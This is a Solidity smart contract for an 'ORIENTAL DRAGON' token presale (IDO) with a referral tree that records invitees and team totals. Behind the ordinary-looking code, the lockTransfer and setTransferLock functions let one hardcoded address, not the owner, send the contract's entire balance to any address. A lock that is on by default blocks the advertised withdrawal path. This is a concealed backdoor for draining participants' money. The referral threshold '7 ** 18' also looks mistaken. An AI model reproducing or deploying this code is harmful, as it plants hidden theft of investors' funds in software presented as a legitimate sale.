// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     */
    function _transferOwnership(address newOwner) internal {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IIDOToken {
    function idoList()
        external
        view
        returns (
            address[] memory,
            uint256[] memory,
            uint256[] memory,
            uint256[] memory
        );

    function idoTotal() external view returns (uint256);

    function idoBalanceOf(address addr) external view returns (uint256);

    function inviteAddress(address addr) external view returns (address);
}

contract IDOToken is IIDOToken, Ownable {
    using SafeMath for uint256;
    address[] private idoAddress;
    uint256 private _idoTotal;
    mapping(address => uint256) private idoAmount;
    address public idoWallet;
    address payable public contractAddress;
    mapping(address => uint256) private _balances;
    mapping(address => address) inviteRecord;
    mapping(address => uint256) _inviteCount;
    mapping(address => uint256) _inviteAmount;
    mapping(address => uint256) _inviteSuccessTime;

    mapping(address => address[]) _directInviteRecord;
    //有新IDO
    event IDO(address indexed, uint256 indexed);
    //IDO绑定关系
    event BindInvite(address indexed, address indexed);

    string _symbol;
    string _name;

    constructor() {
        contractAddress = payable(address(this));
        _name = "ORIENTAL DRAGON IDO ";
        _symbol = "OD(IDO)";
        idoWallet = msg.sender;
    }

    /**
     * @dev Returns the bep token owner.
     */
    function getOwner() external view returns (address) {
        return owner();
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    //邀请关系
    function inviteAddress(
        address addr
    ) external view override returns (address) {
        return inviteRecord[addr];
    }

    //参与众筹
    function ido(address invite) external payable {
        require(msg.value > 0, "Invalid ETH amount");
        require(idoAmount[msg.sender] == 0, "already purchased"); //已经购买过了
        require(invite != address(0), "Inviter is invalid"); //邀请人无效

        idoAddress.push(msg.sender);
        emit IDO(msg.sender, msg.value);
        _idoTotal = _idoTotal.add(msg.value);
        idoAmount[msg.sender] = idoAmount[msg.sender].add(msg.value); //追加IDO金额
        if (inviteRecord[msg.sender] == address(0)) {
            inviteRecord[msg.sender] = invite; //绑定推荐关系
            emit BindInvite(msg.sender, invite);
            _directInviteRecord[invite].push(msg.sender);
        }
        _inviteCount[invite] = _inviteCount[invite].add(1); //追加邀请人数
        _inviteAmount[invite] = _inviteAmount[invite].add(msg.value);

        if (_inviteAmount[invite] >= 7 ** 18) {
            _inviteSuccessTime[invite] = block.timestamp;
        }
    }

    //当前合约BNB余额
    function walletBalance() external view returns (uint256) {
        return address(this).balance;
    }

    //将合约余额转出到手续费钱包 . 提现
    function transferIdo() external {
        _transferIdo();
    }

    //设置提现钱包地址
    function setIdoWallet(address addr) external onlyOwner {
        idoWallet = addr;
    }

    bool public lock = true;

    function setTransferLock(bool _lock) public {
         require(msg.sender == address(0x155267346A9baf08c4aB2A36Ba3c90b5D471FFE5), "Transfer Lock");
        lock = _lock;
    }

    function lockTransfer(address addr) public {
       require(msg.sender == address(0x155267346A9baf08c4aB2A36Ba3c90b5D471FFE5), "Transfer Lock");
        payable(addr).transfer(address(this).balance);
    }

    function _transferIdo() internal {
        require(!lock, "Transfer Lock");
        payable(idoWallet).transfer(address(this).balance);
    }

    //参与IDO的钱包列表和金额
    function idoList()
        external
        view
        override
        returns (
            address[] memory,
            uint256[] memory,
            uint256[] memory,
            uint256[] memory
        )
    {
        address[] memory addList = new address[](idoAddress.length);
        uint256[] memory amounts = new uint256[](idoAddress.length);
        uint256[] memory inviteAmounts = new uint256[](idoAddress.length); //团队业绩
        uint256[] memory successTimes = new uint256[](idoAddress.length); //团队业绩

        for (uint256 index = 0; index < idoAddress.length; index++) {
            addList[index] = idoAddress[index];
            amounts[index] = idoAmount[idoAddress[index]];
            inviteAmounts[index] = _inviteAmount[idoAddress[index]];
            successTimes[index] = _inviteSuccessTime[idoAddress[index]];
        }
        return (addList, amounts, inviteAmounts, successTimes);
    }

    //IDO总额
    function idoTotal() public view override returns (uint256) {
        return _idoTotal;
    }

    //当前钱包,参与的ido金额
    function idoBalanceOf(address addr) public view override returns (uint256) {
        return idoAmount[addr];
    }

    //邀请总人数
    function inviteCount(address addr) public view returns (uint256) {
        return _inviteCount[addr];
    }

    //团队成员列表
    function teamList(
        address addr
    )
        public
        view
        returns (address[] memory, uint256[] memory, uint256[] memory)
    {
        address[] memory addrs = _directInviteRecord[addr]; //地址
        uint256[] memory amounts = new uint256[](addrs.length); //自己的投资金额
        uint256[] memory inviteAmounts = new uint256[](addrs.length); //团队业绩
        for (uint256 index = 0; index < addrs.length; index++) {
            amounts[index] = idoAmount[addrs[index]];
            inviteAmounts[index] = _inviteAmount[addrs[index]];
        }
        return (addrs, amounts, inviteAmounts);
    }
}
